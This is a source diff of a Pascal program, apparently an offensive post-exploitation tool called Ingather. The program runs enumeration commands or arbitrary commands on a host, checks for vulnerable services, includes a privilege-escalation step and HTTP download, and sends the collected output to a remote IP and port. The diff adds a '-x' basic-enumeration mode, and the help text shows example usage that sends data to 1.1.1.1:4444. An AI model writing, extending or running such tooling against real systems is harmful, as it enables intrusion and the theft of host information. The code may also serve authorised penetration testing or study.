@@ -33,19 +33,16 @@ var
   nwrk         : TNetIO;
   escalate     : TRunAs;
   vulns        : TFindVulns;
-  OutputStream : TStream;
   execute      : TRunCMD;
   x            : Integer;
-  output       : AnsiString;
+  output       : AnsiString = '';
   tfOut        : TextFile;
   download     : String;
   save         : String;
   command      : String;
 begin
-  output:= ''; // initialize the string
-
   // quick check parameters
-  ErrorMsg:= CheckOptions('cdehiposz','command download enum help ip out port save');
+  ErrorMsg:= CheckOptions('cdehiposxz','command download enum help ip out port save');
   if ErrorMsg <> '' then begin
     ShowException(Exception.Create(ErrorMsg));
     Terminate;
@@ -74,28 +71,32 @@ begin
   end;
 
   // do vulnerability enumeration on host
-  if HasOption('e','enum') or HasOption('c','command') then begin
+  if HasOption('e','enum') or HasOption('c','command') or HasOption('x') then begin
     execute:= TRunCMD.Create;
     if not HasOption('c','command') then begin
-      vulns:= TFindVulns.Create;
-      for x:= 1 to NUM_CMDS do begin
-        OutputStream:= execute.Run(CMD[x]);
-        output:= concat(output, execute.StreamToString(OutputStream));
+      // just run basic enumeration commands
+      if HasOption('x') then begin
+        if (HasOption('i','ip') and HasOption('p','port')) or HasOption('o','out') then begin
+          for x:= 1 to NUM_CMDS do
+            output:= concat(output, execute.getOutput(CMD[x], '', false));
+        end else
+          writeln('Must use -x with (-i and -p) and/or -o!');
+      // run system enumeration analysis
+      end else begin
+        vulns:= TFindVulns.Create;
+        vulns.getVulnServices;
+        vulns.Free;
       end;
-      vulns.getVulnServices(Output);
-      vulns.Free;
     end else
+      // run command specified with '-c' and send across network
       if HasOption('i','ip') and HasOption('p','port') then begin
         command:= Self.GetOptionValue('c','command');
-        OutputStream:= execute.Run(command);
-        output:= execute.StreamToString(OutputStream);
+        output:= execute.getOutput(command, '', false);
       end else begin
         writeln('Must use -c with -i and -p!');
         Terminate;
         Exit;
       end;
-    OutputStream.Free;
-    execute.Free;
 
     // Send output to another computer?
     if HasOption('i','ip') and HasOption('p','port') then begin
@@ -125,6 +126,7 @@ begin
     else
       writeln('Did not run as admin!!!');}
     escalate.Free;
+    execute.Free;
   end;
 
   Terminate;
@@ -145,7 +147,7 @@ procedure TIngather.WriteHelp;
 begin
   writeln;
   writeln('Usage: Ingather.exe --enum -i 1.1.1.1 -p 4444 -o output.txt');
-  writeln('       Ingather.exe --download http://www.abcded.com/abc.txt --save c:\temp\abc.text');
+  writeln('       Ingather.exe --d http://www.abcded.com/abc.txt -s c:\temp\abc.text');
   writeln('       Ingather.exe -c "ipconfig /all" -i 1.1.1.1 -p 4444');
   writeln;
   writeln('Download file over HTTP:');
@@ -162,6 +164,9 @@ begin
   writeln('       -i --ip          : destination IP address');
   writeln('       -p --port        : destination port');
   writeln('       -o --out         : write enumeration command outputs to file');
+  writeln('       -x               : just run basic enumeration commands');
+  writeln('                          with no vulnerability analysis');
+  writeln('                          requires (-i and -p) and/or -o');
 end;
 
 var
@@ -172,4 +177,3 @@ begin
   Application.Run;
   Application.Free;
 end.
-
